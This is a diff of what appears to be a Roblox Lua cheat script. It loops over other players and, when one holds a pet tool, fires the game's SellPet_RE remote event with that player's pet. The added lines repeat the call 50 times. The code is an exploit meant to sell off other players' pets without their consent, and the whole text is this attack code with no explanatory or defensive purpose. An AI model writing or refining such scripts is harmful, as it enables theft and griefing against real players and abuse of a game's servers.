@@ -645,11 +645,13 @@ spawn(function()
             pcall(function()
             for i,v in pairs(game.Players:GetPlayers()) do
                     if v ~= game.Players.LocalPlayer and v.Character:FindFirstChildOfClass("Tool") and v.Character:FindFirstChildOfClass("Tool"):GetAttribute("ItemType") == "Pet" then
+                        for i= 1,50 do
                         local args = {
                             [1] = v.Character:FindFirstChildOfClass("Tool")
                         }
 
                         game:GetService("ReplicatedStorage"):WaitForChild("GameEvents", 9e9):WaitForChild("SellPet_RE", 9e9):FireServer(unpack(args))
+                        end
                     end
                 end
             end)
